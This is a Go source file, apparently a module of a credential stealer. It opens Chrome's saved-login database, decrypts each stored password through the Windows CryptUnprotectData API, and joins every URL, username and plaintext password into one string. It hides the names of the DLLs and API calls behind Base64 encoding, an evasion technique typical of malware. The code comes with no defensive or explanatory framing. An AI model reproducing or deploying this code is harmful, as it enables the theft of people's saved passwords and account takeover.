package main

import (
	"syscall"
	"unsafe"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"os"
)

const CRYPTPROTECT_UI_FORBIDDEN = 0x1

var (
	dllcrypt32      = syscall.NewLazyDLL(Base64Decode("Q3J5cHQzMi5kbGw="))//Crypt32.dll
	dllkernel32     = syscall.NewLazyDLL(Base64Decode("a2VybmVsMzIuZGxs"))//kernel32.dll
	procDecryptData = dllcrypt32.NewProc(Base64Decode("Q3J5cHRVbnByb3RlY3REYXRh"))//CryptUnprotectData
	procLocalFree   = dllkernel32.NewProc(Base64Decode("TG9jYWxGcmVl"))//LocalFree
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{pbData: &d[0], cbData: uint32(len(d))}
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}
func GetChromePass() []string {
	var (
		username string
		pass     string
		url      string
		data     []string
	)
	path := os.Getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\"
	db, _ := sql.Open("sqlite3", path+"Login Data")
	defer db.Close()

	rows, _ := db.Query("SELECT action_url, username_value, password_value FROM logins")
	defer rows.Close()

	for rows.Next() {
		rows.Scan(&url, &username, &pass)
		pass, _ := Decrypt([]byte(pass))
		row := string(url) + ">>" + string(username) + ">>" + string(pass)
		data = append(data, row)
	}
	return data
}

func GetChromePassString() string {
	finalStr := ""
	arr := GetChromePass()
	i := 0
	for i < len(arr) {
		finalStr = finalStr + arr[i] + "\n"
		i++
	}
	return finalStr
}
